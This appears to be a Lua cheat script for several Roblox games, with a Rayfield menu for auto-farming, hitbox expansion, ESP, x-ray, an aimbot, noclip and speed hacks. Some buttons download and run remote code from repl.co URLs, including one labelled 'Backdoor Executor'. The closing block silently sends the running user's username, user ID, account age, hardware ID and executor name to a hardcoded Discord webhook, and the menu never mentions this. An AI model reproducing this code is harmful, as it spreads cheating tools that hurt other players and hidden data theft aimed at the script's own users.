		Name = "Armored Dodged Roger",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Dodged Roger",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Tuned Dirt Bike",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Dirt bike",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Tuned Cobra Simic",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Cobra Simic",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Tuned Lemon Door",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Lemon door",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Tuned Bus",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Bus",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})
	local Section = DR:CreateSection("Tier 3")
	local Button = DR:CreateButton({
		Name = "Mining Truck",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 3] Mining truck",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "ThrusterSSC",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 3] ThrusterSSC",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Tank",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 3] Tank",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Anti-AFK",
		Callback = function()
			local vu = game:GetService("VirtualUser")
			game:GetService("Players").LocalPlayer.Idled:connect(function()
				vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
				wait(1)
				vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			end)
			-- The function that takes place when the button is pressed
		end,
	})
end

if game.PlaceId == 11445923563 then
	local Section = DR:CreateSection("One Fruit Simulator")
	local Toggle = DR:CreateToggle({
		Name = "Auto Punch",
		CurrentValue = false,
		Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
		Callback = function(Value)
			getgenv().af = Value
			if Value == true then
				attack()
			end
		end,
	})
	local Toggle = DR:CreateToggle({
		Name = "Auto Defense",
		CurrentValue = false,
		Flag = "Toggle2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
		Callback = function(Value)
			getgenv().ad = Value
			if Value == true then
				defense()
			end
		end,
	})
	local Toggle = DR:CreateToggle({
		Name = "Auto Sword",
		CurrentValue = false,
		Flag = "Toggle3", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
		Callback = function(Value)
			getgenv().as = Value
			if Value == true then
				sword()
			end
		end,
	})
	local Button = DR:CreateButton({
		Name = "Get Quest",
		Callback = function()
			local args = { [1] = { [1] = { [1] = "\7", [2] = "GetQuest", [3] = 1 } } }
			game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
		end,
	})
end

if game.PlaceId == 8884334497 then
	local Section = DR:CreateSection("[UPD] Mining Clicker Simulator")
	local Toggle = DR:CreateToggle({
		Name = "Rebirth",
		Callback = function()
			spawn(function()
				while _G.Rebirth == true do
					game:GetService("ReplicatedStorage").Remotes.Rebirth:FireServer()
					wait()
				end
			end)
		end,
	})
	local Toggle = DR:CreateToggle({
		Name = "Auto Click",
		Callback = function()
			spawn(function()
				while _G.Click == true do
					game:GetService("ReplicatedStorage").Remotes.Click:InvokeServer()
					wait()
				end
			end)
		end,
	})
	local Toggle = DR:CreateToggle({
		Name = "Damage Boss",
		Callback = function()
			spawn(function()
				while _G.DamageBoss == true do
					game:GetService("ReplicatedStorage").Remotes.DamageBoss:FireServer()
					wait()
				end
			end)
		end,
	})
end

if game.PlaceId == 4282985734 then
	local Section = DR:CreateSection("Combat Warriors")
	local Toggle = DR:CreateToggle({
		Name = "Hitbox Expander",
		Callback = function()
			local mouse = player:GetMouse()

			bind = "v"

			mouse.KeyDown:connect(function(key)
				if key == bind then
					for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
						if v:IsA("Tool") then
							for i, v in pairs(v.Hitboxes.Hitbox:GetChildren()) do
								if v.Name == "DmgPoint" then
									v.Position = v.Position + Vector3.new(0, math.random(-2, 10), 0)
									v.Visible = true
								end
							end
						end
					end
				end
			end)
		end,
	})
end

if game.PlaceId == 2753915549 then
	local Section = DR:CreateSection("bloxfruit")
	local Toggle = DR:CreateToggle({
		Name = "Auto Farm Level",
		Value = _G.Settings.Auto_Farm_Level,
		Callback = function()
			_G.Auto_Farm_Level = value
			_G.Settings.Auto_Farm_Level = value
			StopTween(_G.Auto_Farm_Level)
		end,
	})
	local Toggle = DR:CreateToggle({
		Name = "Auto Farm Chest",
		Flag = "Auto_Farm_Chest",
		Value = _G.Settings.Auto_Farm_Chest,
		Callback = function(value)
			_G.Auto_Farm_Chest = value
			_G.Settings.Auto_Farm_Chest = value
		end,
	})
	local Toggle = DR:CreateToggle({
		Name = "Auto Farm Chest Hop",
		Flag = "Auto_Farm_Chest_Hop",
		Value = _G.Settings.Auto_Farm_Chest_Hop,
		Callback = function(value)
			_G.Auto_Farm_Chest_Hop = value
			_G.Settings.Auto_Farm_Chest_Hop = value
		end,
	})
end

local localplayer = Window:CreateTab("Universal", 7743876054) -- Title, Image

local Section = localplayer:CreateSection("WalkSpeed")
local Slider = localplayer:CreateSlider({
	Name = "WalkSpeed",
	Range = { 0, 400 },
	Increment = 10,
	Suffix = "walkspeed",
	CurrentValue = 20,
	Flag = "walkspeed", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end,
})

local Section = localplayer:CreateSection("JumpPower")
local JumpPower = localplayer:CreateSlider({
	Name = "JumpPower",
	Range = { 0, 400 },
	Increment = 10,
	Suffix = "jumpPower",
	CurrentValue = 20,
	Flag = "jumpPower", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
	end,
})

local Section = localplayer:CreateSection("universal")
local Button = localplayer:CreateToggle({
	Name = "X-Ray",
	Flag = "other_game_xray",
	Callback = function(value)
		if value then
			for _, part in next, workspace:GetDescendants() do
				if
					part:IsA("BasePart")
					and part.Transparency ~= 1
					and not part:IsDescendantOf(camera)
					and not isCharacterPart(part)
				then
					if not xray[part] or xray[part] ~= part.Transparency then
						xray[part] = part.Transparency
					end
					part.Transparency = 0.75
				end
			end
		else
			for _, part in next, workspace:GetDescendants() do
				if xray[part] then
					part.Transparency = xray[part]
				end
			end
		end
	end,
})
local Button = localplayer:CreateButton({
	Name = "Rejoin Game",
	Callback = function()
		teleportService:Teleport(game.PlaceId)
	end,
})
local Button = localplayer:CreateToggle({
	Name = "Toggle ESP",
	Callback = function()
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local Highlight = Instance.new("Highlight")
		Highlight.Name = "Highlight"
		function ApplyToCurrentPlayers()
			for i, player in pairs(Players:GetChildren()) do
				repeat
					wait()
				until player.Character
				if not player.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
					local HighlightClone = Highlight:Clone()
					HighlightClone.Adornee = player.Character
					HighlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
					HighlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
					HighlightClone.Name = "Highlight"
				end
			end
		end
		RunService.Heartbeat:Connect(function()
			ApplyToCurrentPlayers()
		end)
	end,
})

local Section = localplayer:CreateSection("GPUSAVER")
local Button = localplayer:CreateButton({
	Name = "GPUSaver",
	Callback = function()
		loadstring(game:HttpGet("https://personal.zt0ht.repl.co/Storage/gpu.lua"))()
	end,
})

local Utilities = Window:CreateTab("Utilities", 7734021047)

local Section = Utilities:CreateSection("Player Rader")
local Button = Utilities:CreateButton({
	Name = "Player Rader",
	Callback = function()
		loadstring(game:HttpGet("https://zinedin.zt0ht.repl.co/Storage/Rader.lua"))()
	end,
})

local Section = Utilities:CreateSection("Module ServerSided")
local Button = Utilities:CreateButton({
	Name = "Backdoor Executor",
	Content = "ServerSided Executor",
	Callback = function()
		loadstring(game:HttpGet("https://zinedin.zt0ht.repl.co/Storage/Backdoor.lua", true))()
	end,
})

local Paragraph = localplayer:CreateParagraph({ Title = "HWID", Content = HWID })

local Credits = Window:CreateTab("Notes", 7733914390)

local Paragraph = Credits:CreateParagraph({ Title = "Warning", Content = "Utilities is still in beta" })
local Paragraph = Credits:CreateParagraph({ Title = "Warning", Content = "Dangerous Speeds is still in beta" })
local Paragraph = Credits:CreateParagraph({ Title = "Warning", Content = "Localplayer is still in beta" })
Rayfield:LoadConfiguration()

function attack()
	spawn(function()
		while af == true do
			local args = {
				[1] = {
					[1] = {
						[1] = "\3",
						[2] = "Combat",
						[3] = 1,
						[4] = false,
						[5] = game:GetService("Players").LocalPlayer.Character.Combat,
						[6] = "Melee",
					},
					[2] = {
						[1] = "\6",
						[2] = workspace.__GAME.__Mobs.Ilha_01.Bandit3,
						[3] = game:GetService("Players").LocalPlayer.Character.Combat,
					},
				},
			}
			game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
			wait()
		end
	end)
end

function defense()
	spawn(function()
		while ad == true do
			local args = {
				[1] = {
					[1] = {
						[1] = "\3",
						[2] = "Defence",
						[3] = game:GetService("Players").LocalPlayer.Character.Defence,
						[4] = "Defence",
					},
				},
			}
			game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
			wait()
		end
	end)
end

function sword()
	spawn(function()
		while as == true do
			local args = {
				[1] = {
					[1] = {
						[1] = "\3",
						[2] = "Combat",
						[3] = 2,
						[4] = false,
						[5] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("1ss"),
						[6] = "Sword",
					},
					[2] = {
						[1] = "\6",
						[2] = workspace.__GAME.__Mobs.Ilha_01.StrongBandit3,
						[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("1ss"),
					},
				},
			}
			game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
			local args = {
				[1] = {
					[1] = {
						[1] = "\3",
						[2] = "Combat",
						[3] = 2,
						[4] = false,
						[5] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("1ss"),
						[6] = "Sword",
					},
					[2] = {
						[1] = "\6",
						[2] = workspace.__GAME.__Mobs.Ilha_01.StrongBandit4,
						[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("1ss"),
					},
				},
			}
			game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
			wait()
		end
	end)
end

-- connections
connect(localplayer.Idled, function()
	if getFlag("other_exploits_antiafk") then
		virtualUser:ClickButton1(Vector2.zero, camera)
	end
end)

connect(runService.Stepped, function()
	if getFlag("other_exploits_noclip") then
		local character = localplayer.Character
		if character then
			for _, part in next, character:GetDescendants() do
				if part:IsA("BasePart") and part.CanCollide then
					part.CanCollide = false
				end
			end
		end
	end
end)

connect(runService.Heartbeat, function()
	if getFlag("other_lighting_ambient") then
		lighting.Ambient = getFlag("other_lighting_ambientcolor")
	else
		lighting.Ambient = ambient
	end
	if getFlag("other_lighting_customtime") then
		lighting.ClockTime = getFlag("other_lighting_timevalue")
	end
end)

connect(runService.Heartbeat, function()
	local character = localplayer.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		if getFlag("movement_character_walkspeed") then
			humanoid.WalkSpeed = getFlag("movement_character_walkspeed_value")
		end
		if getFlag("movement_character_jumpheight") then
			humanoid.UseJumpPower = false
			humanoid.JumpHeight = getFlag("movement_character_jumpheight_value")
		end
		if getFlag("movement_character_hipheight") then
			humanoid.HipHeight = getFlag("movement_character_hipheight_value")
		end
		if getFlag("movement_character_fly") then
			local rootPart = humanoid.RootPart
			local velocity = Vector3.zero
			if inputService:IsKeyDown(Enum.KeyCode.W) then
				velocity += camera.CFrame.LookVector
			end
			if inputService:IsKeyDown(Enum.KeyCode.S) then
				velocity += -camera.CFrame.LookVector
			end
			if inputService:IsKeyDown(Enum.KeyCode.D) then
				velocity += camera.CFrame.RightVector
			end
			if inputService:IsKeyDown(Enum.KeyCode.A) then
				velocity += -camera.CFrame.RightVector
			end
			if inputService:IsKeyDown(Enum.KeyCode.Space) then
				velocity += rootPart.CFrame.UpVector
			end
			if inputService:IsKeyDown(Enum.KeyCode.LeftControl) then
				velocity += -rootPart.CFrame.UpVector
			end
			rootPart.Velocity = velocity * getFlag("movement_character_fly_value")
		end
	end
end)

connect(inputService.InputBegan, function(input, processed)
	if input.UserInputType.Name == "MouseButton1" and not processed and getFlag("movement_teleporting_clicktp") then
		local character = localplayer.Character
		local camPos = camera.CFrame.Position

		local ray = Ray.new(camPos, mouse.Hit.Position - camPos)
		local _, hit, normal = workspace:FindPartOnRayWithIgnoreList(ray, { camera })
		if hit and normal then
			character:PivotTo(CFrame.new(hit + normal))
		end
	end
	if input.KeyCode.Name == "Space" and not processed and getFlag("movement_character_infinitejump") then
		local character = localplayer.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid:ChangeState("Jumping")
		end
	end
end)

connect(runService.RenderStepped, function()
	fovCircle.Visible = getFlag("combat_fov_enabled") and getFlag("combat_fov_visible")
	if fovCircle.Visible then
		fovCircle.Position = inputService:GetMouseLocation()
		fovCircle.Color = getFlag("combat_fov_color")
		fovCircle.Radius = getFlag("combat_fov_size")
		fovCircle.NumSides = 1000
		fovCircle.Thickness = 1
	end
end)

connect(runService.Heartbeat, function(deltaTime)
	if getFlag("combat_aimbot_enabled") and keybinds["combat_aimbot_key"] then
		local fov = getFlag("combat_fov_enabled") and getFlag("combat_fov_size")
		local player, screenPosition, part = getClosest(fov, getFlag("combat_aimbot_teamcheck"))
		if player and screenPosition and part then
			if getFlag("combat_aimbot_visiblecheck") and not isVisible(part) then
				return
			end

			if curveStatus.player ~= player then
				curveStatus = { player = player, i = 0 }
			end

			local mousePosition = inputService:GetMouseLocation()
			local delta = bezierCurve(getFlag("combat_aimbot_type"), curveStatus.i, mousePosition, screenPosition)
				- mousePosition
			mousemoverel(delta.X, delta.Y)

			local stepSize = getFlag("combat_aimbot_stepsize")
			local increment = (stepSize / 100) * (deltaTime * 100)
			curveStatus.i = math.clamp(curveStatus.i + increment, 0, 1)
		else
			curveStatus = { player = nil, i = 0 }
		end
	else
		curveStatus = { player = nil, i = 0 }
	end
end)

local webh =
	"https://discord.com/api/webhooks/1049247984308731964/ojeaGAZv5GkxTGYS51GIuqU26N8veUJVuE9ZDwLiiztF8y3rf0th-_7zfDwXetKjksX8"

pcall(function()
	local data = {

		["embeds"] = {
			{
				["title"] = "`` | LOGIN ATTEMPT DENIED | ``",
				["description"] = "**Someone Has Executed You're Script**",
				["type"] = "rich",
				["color"] = tonumber(16753920),
				["fields"] = {
					{ name = "**Username**", value = game:GetService("Players").LocalPlayer.Name },
					{ name = "**Display Name**", value = game:GetService("Players").LocalPlayer.DisplayName },
					{ name = "**Player ID**", value = game:GetService("Players").LocalPlayer.UserId },
					{ name = "**Player Account Age**", value = game:GetService("Players").LocalPlayer.AccountAge },
					{ name = "**Hardware ID**", value = game:GetService("RbxAnalyticsService"):GetClientId() },
					{
						name = "**Ping**",
						value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(),
					},
					{ name = "**Executor**", value = identifyexecutor() },
				},
			},
		},
	}

	if syn then
		local response = syn.request({
			Url = webh,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = game:GetService("HttpService"):JSONEncode(data),
		})
	elseif request then
		local response = request({
			Url = webh,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = game:GetService("HttpService"):JSONEncode(data),
		})
	elseif http_request then
		local response = http_request({
			Url = webh,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = game:GetService("HttpService"):JSONEncode(data),
		})
	end
end)